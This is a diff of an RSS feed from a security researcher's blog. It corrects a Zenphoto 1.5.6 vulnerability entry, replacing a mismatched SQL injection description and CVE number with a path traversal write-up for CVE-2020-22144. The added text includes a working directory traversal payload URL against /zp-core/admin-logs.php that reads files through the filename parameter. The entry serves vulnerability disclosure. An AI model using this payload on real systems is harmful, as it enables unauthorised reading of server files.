@@ -8,21 +8,19 @@
     <language>en-us</language>
     <lastBuildDate>Mon, 10 Feb 2020 00:00:00 +0000</lastBuildDate><atom:link href="https://10degres.net/tags/lfd/index.xml" rel="self" type="application/rss+xml" />
     <item>
-      <title>Path traversal in ZenphotoCMS v1.5.6 and prior</title>
-      <link>https://10degres.net/cves/cve-2020-9996/</link>
+      <title>Path traversal in Zenphoto v1.5.6 and prior</title>
+      <link>https://10degres.net/cves/cve-2020-22144/</link>
       <pubDate>Mon, 10 Feb 2020 00:00:00 +0000</pubDate>
       
-      <guid>https://10degres.net/cves/cve-2020-9996/</guid>
-      <description>An issue was discovered in Simplejobscript.com SJS through 1.66. There is an unauthenticated SQL injection via the job applications search function. The vulnerable parameter is job_id. The function is getJobApplicationsByJobId(). The file is _lib/class.JobApplication.php.
-mitre: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-9996 Description:
+      <guid>https://10degres.net/cves/cve-2020-22144/</guid>
+      <description>An issue in /zp-core/admin-logs.php of Zenphoto 1.5.6 allows attackers to perform a directory traversal and read arbitrary log files.
+mitre: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-22144 Description:
 The admin function allows to download log files from the local system that are not suppose to.
-Environment:
-Version: 1.5.6
-OS: Ubuntu 16.10
-Web server: Apache 2.4.18
-PHP: 7.4.2
-Database: MySQL 5.7.28
-URL: /zp-core/admin-logs.</description>
+Details:
+File: /zp-core/admin-logs.php
+Parameter: filename
+Payload:
+/zp-core/admin-logs.php?action=download_log&amp;amp;page=logs&amp;amp;tab=setup&amp;amp;filename=../../../../../../../../../var/log/alternatives&amp;amp;XSRFToken=bcf89608fdaaa5e293ccd5f83d1614f05bfcbaae PoC:</description>
     </item>
     
   </channel>
